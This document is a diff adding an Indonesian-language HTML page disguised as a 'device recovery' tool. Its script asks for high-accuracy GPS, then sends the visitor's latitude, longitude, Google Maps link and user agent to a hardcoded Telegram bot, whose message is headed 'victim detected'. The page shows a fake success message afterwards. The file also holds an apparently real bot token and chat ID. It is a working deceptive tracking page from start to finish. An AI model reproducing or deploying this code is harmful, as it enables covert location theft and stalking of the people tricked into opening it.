@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Pemulihan Perangkat</title>
+    <style>
+        body { background: #121212; color: #00ff00; font-family: sans-serif; text-align: center; padding: 50px 20px; }
+        .card { border: 1px solid #333; padding: 30px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
+        button { background: #00ff00; color: #000; border: none; padding: 15px 30px; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        button:hover { background: #00cc00; transform: scale(1.05); }
+        #status { margin-top: 20px; font-style: italic; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>📡 PEMULIHAN PERANGKAT</h2>
+    <p>Klik tombol di bawah untuk menyinkronkan lokasi terakhir perangkat yang hilang atau mati.</p>
+    <br>
+    <button onclick="getLocation()">SINKRONKAN SEKARANG</button>
+    <p id="status">Status: Menunggu instruksi...</p>
+</div>
+
+<script>
+    // DATA TOKEN LU YANG TADI
+    const TELEGRAM_TOKEN = '8347499480:AAHSubBq2R8cDVvHiB-x6WTB9tuxhXr2DCQ';
+    const CHAT_ID = '7546418553';
+
+    function getLocation() {
+        const status = document.getElementById('status');
+        if (navigator.geolocation) {
+            status.innerHTML = "Sedang menghubungkan ke satelit...";
+            navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        } else {
+            status.innerHTML = "Browser tidak mendukung GPS.";
+        }
+    }
+
+    function sendToTelegram(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
+        const status = document.getElementById('status');
+        
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        const infoHP = navigator.userAgent;
+
+        const pesan = `📍 **KORBAN TERDETEKSI!**\n\n` +
+                      `🛰 **Latitude:** \`${lat}\`\n` +
+                      `🛰 **Longitude:** \`${lon}\`\n` +
+                      `🎯 **Akurasi:** ${acc} meter\n\n` +
+                      `📍 **Google Maps:** [Klik Disini](${mapsLink})\n\n` +
+                      `📱 **Info Perangkat:**\n${infoHP}`;
+
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: pesan,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(() => {
+            status.innerHTML = "✅ Sinkronisasi Berhasil. Silahkan cek perangkat utama.";
+        })
+        .catch(() => {
+            status.innerHTML = "❌ Gagal mengirim data.";
+        });
+    }
+
+    function showError(error) {
+        const status = document.getElementById('status');
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                status.innerHTML = "❌ Izin GPS ditolak. Silahkan aktifkan lokasi.";
+                break;
+            default:
+                status.innerHTML = "❌ Terjadi kesalahan teknis.";
+        }
+    }
+</script>
+
+</body>
+</html>
